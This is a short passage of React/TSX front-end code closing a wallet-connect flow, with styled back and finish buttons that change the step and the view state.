                variant="ghost"
                size="sm"
                onClick={() => setStep(2)}
                className="text-slate-500 hover:text-white"
                data-testid="button-back-to-phrase"
              >
                {t('walletConnect.step3.back')}
              </Button>
              <Button
                onClick={() => setViewState('dashboard')}
                className="bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white shadow-lg shadow-emerald-900/40"
                data-testid="button-finish-wallet-connect"
              >
                {t('walletConnect.step3.finish')}
                <ArrowRight className="h-4 w-4 ml-1" />
              </Button>
            </div>
          </CardContent>
        </Card>
      )}
    </main>
  );
}
